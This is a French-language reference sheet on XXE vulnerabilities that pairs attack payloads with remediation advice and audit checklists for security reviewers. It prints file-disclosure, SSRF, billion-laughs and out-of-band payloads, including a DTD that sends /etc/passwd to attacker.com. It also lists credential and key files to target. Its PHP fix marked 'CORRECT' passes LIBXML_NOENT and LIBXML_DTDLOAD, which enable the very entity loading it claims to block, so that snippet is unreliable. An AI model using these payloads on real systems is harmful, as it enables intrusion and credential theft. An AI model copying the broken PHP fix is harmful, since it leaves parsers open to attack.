# XML External Entity (XXE)

## Définition

Exploitation de parsers XML vulnérables permettant l'inclusion d'entités externes, conduisant à la lecture de fichiers, SSRF, ou déni de service.

## Sévérité

🔴 **CRITIQUE** - Lecture de fichiers sensibles, SSRF, RCE possible

## Principe de l'Attaque

```
XML avec entité externe :
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

Parser vulnérable résout l'entité et inclut le contenu du fichier
```

## Types d'Attaques XXE

### 1. Classic XXE (In-band)
Données extraites directement dans la réponse

### 2. Blind XXE (Out-of-band)
Extraction via requête vers serveur attacker

### 3. XXE pour SSRF
Requêtes vers services internes

### 4. XXE Billion Laughs (DoS)
Expansion exponentielle d'entités

## Vecteurs d'Attaque

### File Disclosure
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF via XXE
```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service/admin">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-band)
```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

evil.dtd:
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### XXE Denial of Service
```
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
<lolz>&lol9;</lolz>
```

## Localisation dans le Code

### À Chercher

#### XML Parsing
- APIs REST acceptant XML
- SOAP web services
- Configuration files parsing
- Document upload (SVG, DOCX, XLSX)
- RSS/Atom feeds

#### File Formats
- SVG (images)
- Office documents (DOCX, XLSX, PPTX)
- PDF avec XML
- SAML authentication

### Patterns à Grep

```
XML parsers :
- "DocumentBuilder"
- "SAXParser"
- "XMLReader"
- "DOMParser"
- "SimpleXML"
- "lxml"
- "xml.etree"
- "XmlDocument"
- "XDocument"
```

### Frameworks/Libraries
```
Java :
- javax.xml.parsers.DocumentBuilder
- SAXParserFactory
- XMLInputFactory

Python :
- xml.etree.ElementTree
- lxml
- xml.dom.minidom

PHP :
- simplexml_load_string
- DOMDocument

.NET :
- XmlDocument
- XmlTextReader
```

## Impact

### File Disclosure
- /etc/passwd
- /etc/shadow
- Configuration files
- Source code
- Private keys

### SSRF
- Port scanning interne
- Accès services internes
- Cloud metadata (AWS, Azure, GCP)

### Denial of Service
- Billion Laughs attack
- Out of memory
- CPU exhaustion

### Remote Code Execution
- Via PHP expect://
- Via file upload + include

## Remédiation

### 1. Désactiver External Entities (Recommandé)

**Java**
```
✅ CORRECT :
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()
// Désactiver external entities
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false)
dbf.setXIncludeAware(false)
dbf.setExpandEntityReferences(false)
```

**Python**
```
✅ CORRECT :
# Utiliser defusedxml
from defusedxml.ElementTree import parse

# Ou configurer lxml
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)
```

**PHP**
```
✅ CORRECT :
libxml_disable_entity_loader(true)
$dom = new DOMDocument()
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD)
```

**.NET**
```
✅ CORRECT :
XmlReaderSettings settings = new XmlReaderSettings()
settings.DtdProcessing = DtdProcessing.Prohibit
settings.XmlResolver = null
XmlReader reader = XmlReader.Create(stream, settings)
```

### 2. Utiliser Parsers Sécurisés

**Python**
```
✅ CORRECT :
# defusedxml : wrapper sécurisé
from defusedxml import ElementTree as ET
tree = ET.parse('file.xml')
```

**Java**
```
✅ CORRECT :
// Utiliser des parsers récents avec config sécurisée par défaut
```

### 3. Validation et Sanitization

**Schema Validation**
- Valider contre XSD
- Rejeter documents non conformes
- Whitelist des structures autorisées

**Input Validation**
- Longueur maximale
- Caractères autorisés
- Rejeter DOCTYPE declarations

### 4. Éviter XML si Possible

**Alternatives**
- JSON (pas de XXE)
- YAML (avec parser sécurisé)
- Protocol Buffers
- MessagePack

### 5. Least Privilege

**Permissions Filesystem**
- Application avec utilisateur non-privilégié
- Pas d'accès fichiers sensibles
- Chroot/container

### 6. WAF Rules

**Detection Patterns**
- <!DOCTYPE
- <!ENTITY
- SYSTEM
- file://
- http:// dans XML

## Checklist d'Audit

### Recherche de Vulnérabilités
- [ ] Application accepte XML input ?
- [ ] Parser XML sans config sécurisée ?
- [ ] External entities activées ?
- [ ] Upload de fichiers avec XML (SVG, Office) ?
- [ ] SOAP endpoints ?
- [ ] Configuration parsing ?

### Validation des Correctifs
- [ ] External entities désactivées ?
- [ ] DTD processing désactivé ?
- [ ] Parser sécurisé utilisé (defusedxml) ?
- [ ] Schema validation en place ?
- [ ] Least privilege filesystem ?

### Tests de Vulnérabilité
- [ ] Tester avec file:///etc/passwd ?
- [ ] Tester blind XXE vers serveur contrôlé ?
- [ ] Tester SSRF vers localhost ?
- [ ] Tester billion laughs ?
- [ ] Tester dans SVG/Office uploads ?

## Fichiers Cibles

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/root/.ssh/id_rsa
~/.aws/credentials
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\Users\Administrator\.ssh\id_rsa
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/
```

### Application Files
```
/var/www/html/config.php
/app/config/database.yml
/etc/nginx/nginx.conf
```

## Configuration Sécurisée par Langage

### Java
```
✅ Toutes features désactivées :
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
dbf.setXIncludeAware(false)
dbf.setExpandEntityReferences(false)
```

### Python
```
✅ defusedxml partout :
from defusedxml.ElementTree import parse
from defusedxml import xmlrpc
```

### PHP
```
✅ Entities disabled :
libxml_disable_entity_loader(true)
libxml_use_internal_errors(true)
```

### .NET
```
✅ DTD prohibited :
settings.DtdProcessing = DtdProcessing.Prohibit
settings.XmlResolver = null
```

## Références

- **OWASP** : XML External Entity (XXE)
- **CWE-611** : Improper Restriction of XML External Entity Reference
- **OWASP XXE Prevention Cheat Sheet**
